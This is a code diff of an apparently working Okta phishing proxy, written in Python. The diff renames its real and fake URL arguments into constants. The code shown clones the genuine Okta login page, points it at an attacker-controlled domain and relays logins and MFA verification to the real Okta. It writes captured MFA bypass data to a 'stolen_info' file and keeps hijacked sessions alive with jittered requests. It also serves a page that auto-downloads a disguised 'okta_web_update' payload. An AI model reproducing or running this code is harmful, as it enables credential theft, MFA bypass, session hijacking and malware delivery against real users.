@@ -76,6 +76,11 @@ parser.add_option('-c', '--content-type',
     help="content type for payload. Default: 'application/octet-stream'", default="application/octet-stream")
 
 (options, args) = parser.parse_args()
+REAL_OKTA_URL = args[0]
+REAL_OKTA_DOMAIN = re.compile(r'https?://(.*?)/').findall(REAL_OKTA_URL)[0]
+FAKE_OKTA_URL = args[1]
+FAKE_OKTA_DOMAIN = re.compile(r'https?://(.*?)/').findall(FAKE_OKTA_URL)[0]
+
 
 # For the result server
 
@@ -114,7 +119,7 @@ def quiet_print(string, log=False):
 
 def download_site():
     quiet_print("Downloading index.html...", True)
-    response = urllib.request.urlopen(args[0])
+    response = urllib.request.urlopen(REAL_OKTA_URL)
     webContent = response.read()
     if not os.path.exists(os.path.dirname("webroot/index.html")):
         try:
@@ -138,7 +143,7 @@ def download_site():
         index.write(webContent.decode())
 
     quiet_print("Downloading 404.html...", True)
-    response = requests.get(args[0] + "/404")
+    response = requests.get(REAL_OKTA_URL + "/404")
     webContent = response.content
     with open("webroot/errors/404.html", 'w+') as error:
         error.write(webContent.decode())
@@ -167,12 +172,12 @@ def download_site():
                         link.click();
                         document.body.removeChild(link);
                         delete link;
-                        window.location = \"""" + args[0] + """\";
+                        window.location = \"""" + REAL_OKTA_URL + """\";
                       }
                     </script>
                     </head>
 
-                <body onload='downloadURI(\"""" + args[1] + """/download-update", "okta_web_update.""" + options.extension + """\")'>
+                <body onload='downloadURI(\"""" + FAKE_OKTA_URL + """/download-update", "okta_web_update.""" + options.extension + """\")'>
                 </body>
                 </html>""")
     except IOError as e:
@@ -193,11 +198,11 @@ def encode_replacement(replace_url):
 
 def modify_index():
     quiet_print("Modifying index.html...", True)
-    target_re = re.match(r'(https?://)(.*)', args[0])
+    target_re = re.match(r'(https?://)(.*)', REAL_OKTA_URL)
 
     with open("webroot/index.html", 'r+') as index:
         index_content = index.read()
-        base_url = args[1].replace('\\', '\\\\').replace("'", "\\'")
+        base_url = FAKE_OKTA_URL.replace('\\', '\\\\').replace("'", "\\'")
         base_url_replace = "var baseUrl = '" + base_url + "'\n"
         index_content_new = re.sub(
             r"var baseUrl = .*\n", base_url_replace, index_content)
@@ -221,9 +226,9 @@ def main():
       quiet_print("----------" + start_time + "-----------", True)
       log_print("----------------------------------------")
       download = requests.Session()
-      live_check = download.get(args[0])
+      live_check = download.get(REAL_OKTA_URL)
       if (live_check.status_code != 200):
-          quiet_print("Host: " + args[0] + " failed live (200) check", True)
+          quiet_print("Host: " + REAL_OKTA_URL + " failed live (200) check", True)
           quiet_print("Exiting...", True)
           exit(1)
 
@@ -320,7 +325,7 @@ class S(BaseHTTPRequestHandler):
     def do_OPTIONS(self):
         self.send_response(200, "ok")
         self.send_header('Access-Control-Allow-Credentials', 'true')
-        self.send_header('Access-Control-Allow-Origin', args[1])
+        self.send_header('Access-Control-Allow-Origin', FAKE_OKTA_URL)
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
         self.send_header("Access-Control-Allow-Headers",
                          "X-Requested-With, Content-type")
@@ -436,7 +441,7 @@ class S(BaseHTTPRequestHandler):
                 else:
                     self.send_response(301)
                     self.send_header("Connection", "close")
-                    self.send_header('Location', args[0])
+                    self.send_header('Location', REAL_OKTA_URL)
                     self.end_headers()
             else:
                 self._set_headers(404)
@@ -500,7 +505,7 @@ class S(BaseHTTPRequestHandler):
                         quiet_print("Appears that only U2F-2FA factors are used", True)
 
                 bypass = json.dumps(j)
-                bypass = bypass.replace(args[0], args[1])
+                bypass = bypass.replace(REAL_OKTA_URL, FAKE_OKTA_URL)
                 with open("stolen_info/bypass.txt", "a") as outfile:
                     outfile.write(bypass)
                     outfile.write("\n\n")
@@ -521,7 +526,7 @@ class S(BaseHTTPRequestHandler):
                 self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                 data = simplejson.loads(self.data_string)
                 response = handle_mfa_verify(self.path, data)
-                new_content = response.content.replace(args[0].encode(), args[1].encode())
+                new_content = response.content.replace(REAL_OKTA_URL.encode(), FAKE_OKTA_URL.encode())
 
                 rid = self.get_rid_cookie()
                 if (rid != None and rid != ""):
@@ -566,7 +571,7 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 def get_okta_session(url, JSESSION_ID):
     cookies = {'JSESSIONID': JSESSION_ID}
     s = requests.Session()
-    r = s.get(args[0] + url, headers=headers,
+    r = s.get(REAL_OKTA_URL + url, headers=headers,
               cookies=cookies, allow_redirects=False)
     return (s, r)
 
@@ -575,12 +580,12 @@ def okta_authenticate(username, password):
     data = {'usrname': username, 'password': password, 'relayState': '/app/userHome#',
         'options': {'multiOptionalFactorEnroll': 'false', 'warnBeforePasswordExpired': 'false'}}
     response = requests.post(
-        '{}/api/v1/authn'.format(args[0]), headers=headers, json=data)
+        '{}/api/v1/authn'.format(REAL_OKTA_URL), headers=headers, json=data)
     return response
 
 
 def handle_mfa_verify(slug, data):
-    response = requests.post(args[0] + slug, headers=headers, json=data)
+    response = requests.post(REAL_OKTA_URL + slug, headers=headers, json=data)
     return response
 
 
@@ -598,7 +603,7 @@ def sessions_management():
             for sesh in user.sessions:
                 # 4 seconds + jitter
                 time.sleep(4 + random.randint(0,20))
-                sesh.get(args[0])
+                sesh.get(REAL_OKTA_URL)
         lock.release()
         # 5 minutes + jitter
         time.sleep((5 * 60) + random.randint(0,2 * 60))
